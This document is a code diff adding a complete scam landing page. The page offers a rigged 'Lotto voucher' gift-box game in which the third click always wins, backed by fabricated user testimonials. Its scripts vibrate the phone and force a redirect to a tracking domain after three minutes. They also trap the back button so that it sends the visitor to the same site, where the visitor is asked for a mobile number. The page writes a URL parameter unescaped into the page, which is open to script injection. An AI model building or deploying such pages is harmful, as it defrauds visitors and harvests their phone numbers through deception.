@@ -1,0 +1,179 @@
+<!doctype html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="style.css">
+	<title>Congratulations!</title>
+	<meta name="description" content="">
+	<meta name="keywords" content="">
+    <script>
+    function getURLParameter(name) {
+          name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
+          var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
+            results = regex.exec(location.search);
+          return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
+        }
+    </script>
+</head>
+<body>
+	<div class="wrapper">
+		<div class="header">
+			<img src="img/loto.png">
+			<!--<strong>Parabéns!</strong><br>Data do sorteio: <span id="date"></span><br>-->
+		</div>
+		<div class="content">
+			<div class="client"><!--<img src="img/pt.png" class="client_flag">--><strong>Dear customer,</strong><br>Every day we select 7 lucky customers from <strong><script>document.write(getURLParameter('country'))</script></strong> to receive a reward.
+			</div>
+			<div class="info">All you have to do is choose the right gift box<br><strong>Find a Lotto voucher ($100, $250, $500)</strong></div>
+			<div class="boxs">
+				<div class="box"><img src="img/box.jpg"></div>
+				<div class="box"><img src="img/box.jpg"></div>
+				<div class="box"><img src="img/box.jpg"></div>
+				<div class="box"><img src="img/box.jpg"></div>
+				<div class="box"><img src="img/box.jpg"></div>
+				<div class="box"><img src="img/box.jpg"></div>
+				<div class="box"><img src="img/box.jpg"></div>
+				<div class="box"><img src="img/box.jpg"></div>
+				<div class="box"><img src="img/box.jpg"></div>
+			</div>
+			<div class="comments">
+				<div class="comment">
+					<div class="comment_img">
+						<img src="ava/001.jpg">
+					</div>
+					<div class="comment_name">Ashley</div>
+					<div class="comment_text">I got a call saying I had won, I'm super happy!</div>
+					<div class="comment_info"><span>Taste</span> · <span>Share</span> · <span>3 minutes</span></div>
+				</div>
+				<div class="comment">
+					<div class="comment_img">
+						<img src="ava/002.jpg">
+					</div>
+					<div class="comment_name">Alice </div>
+					<div class="comment_text">I participated, I won and in 5 days I received my coupon, thank you guys</div>
+					<div class="comment_info"><span>Taste</span> · <span>Share</span> · <span>15 minutes</span></div>
+				</div>
+				<div class="comment">
+					<div class="comment_img">
+						<img src="ava/003.jpg">
+					</div>
+					<div class="comment_name">Barbara </div>
+					<div class="comment_text">Are there more surveys to do?</div>
+					<div class="comment_info"><span>Taste</span> · <span>Share</span> · <span>37 minutes</span></div>
+				</div>
+				<div class="comment">
+					<div class="comment_img">
+						<img src="ava/008.jpg">
+					</div>
+					<div class="comment_name">Carl </div>
+					<div class="comment_text">Is it possible for you to send me my gift card today? Thanks.</div>
+					<div class="comment_info"><span>Taste</span> · <span>Share</span> · <span>54 minutes</span></div>
+				</div>
+				<div class="comment">
+					<div class="comment_img">
+						<img src="ava/004.jpg">
+					</div>
+					<div class="comment_name">Diana</div>
+					<div class="comment_text">I love awards like this!</div>
+					<div class="comment_info"><span>Taste</span> · <span>Share</span> · <span>1 hour</span></div>
+				</div>
+				<div class="comment">
+					<div class="comment_img">
+						<img src="ava/005.jpg">
+					</div>
+					<div class="comment_name">Linda </div>
+					<div class="comment_text">Shit! I didn't get anything :(</div>
+					<div class="comment_info"><span>Taste</span> · <span>Share</span> · <span>2 hour</span></div>
+				</div>
+				<div class="comment">
+					<div class="comment_img">
+						<img src="ava/006.jpg">
+					</div>
+					<div class="comment_name">Margaret </div>
+					<div class="comment_text">This is phenomenal! never won anything</div>
+					<div class="comment_info"><span>Taste</span> · <span>Share</span> · <span>2 hour</span></div>
+				</div>
+				<div class="comment">
+					<div class="comment_img">
+						<img src="ava/007.jpg">
+					</div>
+					<div class="comment_name">Molly </div>
+					<div class="comment_text">I thought it was a lie, but the gift card arrived this morning in the mail and I would love to do more research!</div>
+					<div class="comment_info"><span>Taste</span> · <span>Share</span> · <span>4 hour</span></div>
+				</div>
+			</div>
+		</div>
+		<div class="footer">
+			<img src="img/loto.png">
+		</div>
+	</div>
+	<script src="js/jquery-3.5.1.min.js"></script>
+	<script src="js/sweetalert2.js"></script>
+	<script>
+	Swal.fire({
+	    title: 'Rewards event',
+	    html: "Congratulations, dear customer!<br><br>To thank you for your loyalty to us, we are giving you the opportunity to win an <strong>Lotto Voucher ($100, $250, $500)</strong><br><br>Open boxes to participate and win prizes!<br><br><strong>Good Luck!</strong>",
+	    confirmButtonText: 'OK',
+	    confirmButtonColor: '#ff9900',
+	});
+	function dialog1() {
+	    Swal.fire({
+	        text: 'Unfortunately, this box is empty. There are still (2) attempts. Good luck!',
+	        confirmButtonText: 'OK',
+	        confirmButtonColor: '#ff9900',
+	        icon: 'success'
+	});
+	}
+	function dialog2() {
+	    Swal.fire({
+	        text: 'Unfortunately, this box is empty. Still have (1) to try. Good luck!',
+	        confirmButtonText: 'OK',
+	        confirmButtonColor: '#ff9900',
+	        icon: 'success'
+	    });
+	}
+	function dialog3() {
+	    Swal.fire({
+	        imageUrl: 'img/iphone11pro.png',
+	        html: '<strong>Can be a Winner of:</strong> <h2>Lotto Voucher $500</h2><br><h3>Next Steps:</h3><br>1. You will be redirected to the partner website<br>2. Enter your mobile number<br>3. Get your Lotto Voucher',
+	        allowOutsideClick: false,
+	        showConfirmButton: false,
+	        footer: '<a href="https://coogletrck3.com/click.php?lp=1">Confirm</a>'
+	    });
+	}
+	i = 0;
+	$('.box').click(function () {
+	    i++;
+	    if (i == 1) {
+	        $(this).html('<img src="img/box_open.jpg">');
+	        $(dialog1()).load();
+	    }
+	    if (i == 2) {
+	        $(this).html('<img src="img/box_open.jpg">');
+	        $(dialog2()).load();
+	    }
+	    if (i == 3) {
+	        $(this).html('<img src="img/box-500.jpg">');
+	        $(dialog3()).load();
+	    }
+	});
+	</script>
+<script>
+	navigator.vibrate([1000, 300, 1000, 300, 1000]);
+</script>
+<script language="javascript">
+	window.setTimeout(function() {
+		window.location.href = 'https://coogletrck3.com/click.php?lp=1';
+	}, 180000);
+</script>
+<script>
+	window.history.pushState({ page: 1 }, '', '');
+	window.onpopstate = function(event) {
+		if (event) {
+			window.location.href = 'https://coogletrck3.com/click.php?key=0lp9k1kle3m19wqtwn9o';
+		}
+	}
+</script>
+</body>
+</html>
